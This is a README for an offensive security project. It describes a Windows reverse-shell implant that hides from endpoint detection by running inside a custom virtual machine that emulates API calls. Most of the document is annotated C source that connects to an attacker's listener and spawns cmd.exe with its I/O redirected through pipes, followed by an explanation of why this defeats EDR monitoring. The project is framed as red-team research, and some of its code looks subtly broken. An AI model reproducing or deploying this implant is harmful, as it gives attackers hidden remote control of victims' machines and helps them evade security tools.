# EDR-Evasion-Through-Malware-Virtualisation
Reverse shell implant using full API emulation and virtualization for advanced EDR evasion. By abstracting execution and simulating system API calls inside a virtual machine, the implant bypasses traditional detection methods. Ideal for studying modern evasion techniques in red teaming and malware research.

## Acknowledgements
This project is based on techniques and concepts described in the Fox-IT blog post (https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/) authored by Erik de Jong and Frank Breedijk. Their research on using malware virtualization for EDR evasion inspired the approach taken in this reverse shell implant, where API calls are simulated within a virtual machine, allowing for the bypassing of traditional EDR detection methods.

## Overview
This document provides a detailed explanation of how the reverse shell implant script works, the differences from the previous version `implant_vm.c` (without full API emulation), how full virtualization is implemented, and why this approach is effective in evading Endpoint Detection and Response (EDR) systems. It also includes the full script code and compilation instructions.

## Key Concepts

### 1. Reverse Shell:
A reverse shell is a connection initiated from the victim's machine back to the attacker's machine. This allows the attacker to execute commands on the victim's machine remotely.

### 2. Virtualization in Malware:
Virtualization involves creating a virtual machine (VM) within the malware to execute its code. The VM interprets bytecode or instructions, which obfuscates the actual operations from traditional security solutions. This makes it harder for EDR to detect the malicious code because the actual system interactions are abstracted behind a layer of emulation.

### 3. API Emulation:
In `implant_vm_api.c` version of the reverse shell, specific system API calls are emulated within the virtual machine. Instead of directly invoking Windows APIs like `CreateFile` or `Sleep`, the VM interprets API calls, further obfuscating system behavior from EDR solutions.

---

## How the Script Works

### Differences between both script versions:
1. **Full API Emulation**: 
   - In the previous version `implant_vm.c`, the reverse shell was triggered directly without API abstraction. In `implant_vm_api.c` version, API calls are simulated inside the VM. For instance, the reverse shell is initiated via an API call that the VM interprets, making detection by EDR systems more challenging.

2. **Advanced Virtualization**:
   - The `implant_vm.c` version used a simpler dispatch loop to handle operations like launching the reverse shell. In `implant_vm_api.c` version, the VM handles more complex instruction sets, registers, and API calls, adding another layer of abstraction. The registers simulate real CPU registers (`RAX`, `RCX`, etc.) used to store parameters for the emulated APIs.


### Full Virtualization in This Script `implant_vm_api.c`:
1. **Operand Structures and Registers**:
   - The script defines structures for operands (immediate values, memory, and registers) and a set of general-purpose registers that emulate real CPU registers (`RAX`, `RCX`, `RDX`, etc.). These registers hold values such as the IP address, port, and API IDs.

2. **Instruction Dispatch**:
   - The virtual machine dispatches instructions to handle the reverse shell. Instructions can trigger API calls that simulate real system behavior. For instance, an instruction may set up a reverse shell by storing the server IP and port in the emulated registers and then triggering the reverse shell API via the VM.

3. **Pipes for Input/Output Redirection**:
   - To ensure the reverse shell remains interactive, pipes are used to handle the `stdin`, `stdout`, and `stderr` streams between `cmd.exe` and the socket connection to the attacker. This relays all input and output between the shell and the attacker over the network.

---

## Why This Approach Works for EDR Evasion

### General EDR Evasion:
1. **Abstraction Through Virtualization**:
   - By executing the malicious behavior inside a virtual machine, the actual system operations (e.g., creating a reverse shell) are obfuscated. EDR systems typically monitor for known API calls or system events, but in this case, the operations are hidden within the VM's bytecode execution, making them harder to detect.

2. **Simulated API Calls**:
   - EDR systems monitor API calls to detect potentially malicious behavior. In this version of the script, API calls (like creating the reverse shell) are abstracted into emulated API functions. This means the actual system calls aren't directly observable by the EDR system.

### Comparison to the Previous Version:
1. **Previous Version**: 
   - The previous version directly launched the reverse shell, albeit abstracted behind a basic VM. This version adds another layer by simulating API calls, making it even more difficult for EDR systems to identify and flag suspicious activity.
   
2. **Full API Emulation**: 
   - The current script introduces a full API emulation layer, which adds complexity and makes static analysis and behavior-based detection more challenging. The system APIs are no longer called directly by the malware but are simulated within the virtual environment.

---

## Script Code (Step-by-Step Explanation)

```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#pragma comment(lib, "ws2_32.lib")
```

#### Explanation:
- These are the necessary libraries for socket communication (`winsock2.h`), Windows API interaction (`windows.h`), and standard input/output operations (`stdio.h`).
- `stdint.h` provides fixed-width integer types like `uint64_t`.

```c
#define STACK_SIZE 128
#define NUM_REGISTERS 17
```

#### Explanation:
- `STACK_SIZE`: Defines the size of the virtual machine (VM) stack (128 bytes).
- `NUM_REGISTERS`: Defines the number of general-purpose registers in our VM (17). This simulates a simplified version of a real CPU's register set.


```c
enum Registers {
    RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP, RIP, RFLAGS,
    R8, R9, R10, R11, R12, R13, R14, R15
};
```

#### Explanation:
- This `enum` defines the general-purpose registers used by the virtual machine. These registers simulate actual CPU registers.
  - `RAX`, `RCX`, `RDX`, etc., are all standard CPU registers. 
  - `RIP` holds the instruction pointer (points to the current instruction).
  - `RFLAGS` holds flags used for condition checks.

```c
struct ImmediateOperand {
    uint64_t value;
};
```

#### Explanation:
- Defines an operand that contains an immediate value (a constant). This struct simulates operands that directly provide data to instructions.

```c
struct MemoryOperand {
    uint8_t size;
    uint8_t base;
    uint8_t index;
    uint8_t scale;
    int32_t displacement;
};
```

#### Explanation:
- Defines an operand that refers to memory. 
  - `size`: The size of the memory being accessed (e.g., 8, 16, 32, or 64 bits).
  - `base`: The base register (holds a pointer to memory).
  - `index`: The index register (used for array access).
  - `scale`: The multiplier for the index.
  - `displacement`: Offset added to the base address.

```c
struct RegisterOperand {
    uint8_t reg;
    uint8_t chunk;
    uint16_t size;
    uint32_t pad;
};
```

#### Explanation:
- Defines an operand that refers to a register. 
  - `reg`: Specifies the register being used (e.g., RAX, RBX).
  - `chunk`: Specifies which part of the register (e.g., the low or high byte).
  - `size`: The size of the register.

```c
union Operand {
    struct ImmediateOperand imm;
    struct MemoryOperand mem;
    struct RegisterOperand reg;
};
```

#### Explanation:
- A union to represent any of the operand types (immediate, memory, or register). This structure is used by instructions to determine which type of operand is being referenced.

```c
struct Instruction {
    uint8_t opcode;
    uint8_t lparam_type : 4;
    uint8_t rparam_type : 4;
    union Operand lparam;
    union Operand rparam;
};
```

#### Explanation:
- Represents an instruction in the virtual machine.
  - `opcode`: Specifies which operation is being performed (e.g., addition, API call).
  - `lparam_type`: The type of the left operand.
  - `rparam_type`: The type of the right operand.
  - `lparam` and `rparam`: The operands themselves, either immediate values, registers, or memory addresses.

```c
struct Context {
    uint32_t ip;                    // Instruction pointer
    uint8_t flags;                  // Status flags for condition checks
    uint64_t registers[NUM_REGISTERS];  // General purpose registers
    struct Instruction* instructions;   // Pointer to the list of instructions
    uint8_t stack[STACK_SIZE];      // The virtual machine stack
};
```

#### Explanation:
- This structure represents the virtual machine’s entire execution context.
  - `ip`: The instruction pointer, which points to the current instruction being executed.
  - `flags`: The flags register, used to store status information like zero flag, carry flag, etc.
  - `registers`: Simulated CPU registers for holding operands and intermediate values.
  - `instructions`: A pointer to the list of instructions the VM will execute.
  - `stack`: The stack used by the virtual machine.

This structure represents the virtualized environment. **All execution happens inside this VM, which abstracts away actual system interactions from the host environment, providing obfuscation.**

### Reverse Shell API Call:

```c
void emulated_reverse_shell(struct Context* vm) {
    const char* server_ip = (const char*)vm->registers[RCX];  // Server IP in RCX
    uint64_t port = vm->registers[RDX];                       // Port in RDX
    printf("Emulating reverse shell to %s:%llu
", server_ip, port);
```

#### Explanation:
- The `server_ip` and `port` for the reverse shell connection are stored in the `RCX` and `RDX` registers. This is how parameters are passed inside the VM.


### Socket Setup:

```c
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
```

#### Explanation:
- This sets up the necessary components to make a network connection (reverse shell). The `socket()` function creates a TCP socket.

### Connect to the Attacker’s Listener:

```c
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons((uint16_t)port);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed: %d
", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }
```

#### Explanation:
- This code connects to the attacker’s listener using the specified `server_ip` and `port` passed into the virtual machine via the registers. The actual `connect()` call is made outside the virtualized environment, while the setup happens inside the VM.

### Pipes for I/O Redirection:

```c
    // Setup pipes for process I/O redirection
    HANDLE hReadPipeIn, hWritePipeIn, hReadPipeOut, hWritePipeOut;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    CreatePipe(&hReadPipeIn, &hWritePipeIn, &sa, 0);
    CreatePipe(&hReadPipeOut, &hWritePipeOut, &sa, 0);
```

#### Explanation:
- Pipes are created to redirect the input/output between the shell (`cmd.exe`) and the attacker. This ensures that all interactions from the reverse shell are forwarded properly.


### Command Execution:

```c
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hReadPipeIn;
    si.hStdOutput = hWritePipeOut;
    si.hStdError = hWritePipeOut;

    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %d
", GetLastError());
        return;
    }
```

#### Explanation:
- This code starts a new process (`cmd.exe`) with input/output redirected through the pipes, ensuring that all interactions are passed through the reverse shell connection.

### Virtual Machine (VM) Operation:

```c
void emulate_api_call(struct Context* vm) {
    uint64_t api_id = vm->registers[RAX];  // The API ID is stored in RAX
    switch (api_id) {
        case 0x01:  // Reverse shell API call
            emulated_reverse_shell(vm);
            break;
        default:
            printf("Unknown API Call ID: %llu
", api_id);
            break;
    }
}
```

#### Explanation:
- This function emulates an API call inside the virtual machine. The API ID (e.g., for launching the reverse shell) is stored in the `RAX` register. When the virtual machine interprets an API call, it checks this ID and performs the corresponding operation.

---

## Conclusion
This project demonstrates the power of using virtualization and API emulation to evade modern Endpoint Detection and Response (EDR) solutions. By abstracting execution and simulating API calls within a virtual machine, the implant successfully obfuscates its behavior, making it harder for traditional security solutions to detect malicious activity. With techniques inspired by the work of Fox-IT, this project offers a practical example of how attackers may employ advanced evasion strategies, highlighting the need for evolving defenses in the cybersecurity landscape.

## Disclaimer
This project is for educational and research purposes only. It is intended to help security professionals understand modern evasion techniques and improve defense strategies. Any unauthorized use of this code to target systems without permission is illegal and unethical. The authors of this project are not responsible for any misuse or damage caused by the implementation of this code. Always ensure you have explicit permission before testing on any network or system.
